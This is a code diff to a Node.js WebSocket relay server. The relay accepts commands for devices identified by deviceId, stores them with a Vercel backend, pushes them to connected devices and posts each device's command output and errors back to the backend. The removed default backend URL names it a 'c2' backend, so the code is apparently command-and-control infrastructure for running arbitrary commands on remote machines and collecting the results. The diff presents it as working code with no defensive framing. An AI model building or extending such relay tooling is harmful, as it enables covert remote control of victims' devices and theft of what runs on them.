@@ -18,10 +18,10 @@ const wss = new WebSocket.Server({ server });
 const clients = new Map();
 
 // ============================================================
-//  BACKEND URL – Change this to your Vercel backend
-//  You can also set it as environment variable BACKEND_URL
+//  BACKEND URL – CHANGE THIS TO YOUR VERCELL BACKEND
+//  Set environment variable BACKEND_URL or edit the default.
 // ============================================================
-const BACKEND_URL = process.env.BACKEND_URL || 'https://c2-vercel-backend.vercel.app';
+const BACKEND_URL = process.env.BACKEND_URL || 'https://nexus-backend-v2.vercel.app';
 
 // ============================================================
 //  WEBSOCKET CONNECTION HANDLER
@@ -38,9 +38,32 @@ wss.on('connection', (ws, req) => {
     console.log(`[Relay] ✅ Connected: ${deviceId}`);
     clients.set(deviceId, ws);
 
-    ws.on('message', (msg) => {
+    ws.on('message', async (msg) => {
         console.log(`[Relay] 📩 From ${deviceId}: ${msg}`);
-        // Optionally handle messages from client
+        try {
+            const data = JSON.parse(msg);
+            // Check if this is a command result
+            if (data.output !== undefined || data.error !== undefined) {
+                // Forward result to backend
+                const { commandId, output, error } = data;
+                if (commandId) {
+                    await axios.post(`${BACKEND_URL}/api/submit-result`, {
+                        deviceId,
+                        commandId,
+                        output: output || '',
+                        error: error || ''
+                    });
+                    console.log(`[Relay] ✅ Result stored for command ${commandId}`);
+                } else {
+                    console.warn('[Relay] ⚠️ Result received without commandId, ignoring.');
+                }
+            } else {
+                // Other messages – just log
+                console.log(`[Relay] 📩 Unrecognized message: ${msg}`);
+            }
+        } catch (e) {
+            console.error(`[Relay] ❌ Error processing message: ${e.message}`);
+        }
     });
 
     ws.on('close', () => {
@@ -66,35 +89,33 @@ app.post('/send-command', async (req, res) => {
         });
     }
 
-    // 1. Store command in Supabase via Vercel backend
     try {
-        await axios.post(`${BACKEND_URL}/api/send-command`, {
+        // 1. Store command in Supabase via Vercel backend and get commandId
+        const storeResponse = await axios.post(`${BACKEND_URL}/api/send-command`, {
             deviceId: deviceId,
             command: command
         });
-        console.log(`[Relay] ✅ Command stored in backend for ${deviceId}`);
-    } catch (e) {
-        console.error(`[Relay] ❌ Failed to store command: ${e.message}`);
-        // Continue anyway – the command may still be delivered via WebSocket
-    }
+        const commandId = storeResponse.data.commandId;
+        console.log(`[Relay] ✅ Command stored in backend (ID: ${commandId}) for ${deviceId}`);
 
-    // 2. Send command via WebSocket (if device is connected)
-    const ws = clients.get(deviceId);
-    if (!ws || ws.readyState !== WebSocket.OPEN) {
-        return res.status(404).json({
-            success: false,
-            error: 'Device not connected or offline'
-        });
-    }
+        // 2. Send command + commandId via WebSocket (if device is connected)
+        const ws = clients.get(deviceId);
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+            return res.status(404).json({
+                success: false,
+                error: 'Device not connected or offline'
+            });
+        }
 
-    try {
-        ws.send(JSON.stringify({ command }));
-        console.log(`[Relay] 📤 Command sent to ${deviceId}: ${command}`);
+        ws.send(JSON.stringify({ command, commandId }));
+        console.log(`[Relay] 📤 Command sent to ${deviceId}: ${command} (ID: ${commandId})`);
         res.json({
             success: true,
             message: 'Command sent via WebSocket'
         });
+
     } catch (e) {
+        console.error(`[Relay] ❌ Error processing command: ${e.message}`);
         res.status(500).json({
             success: false,
             error: e.message
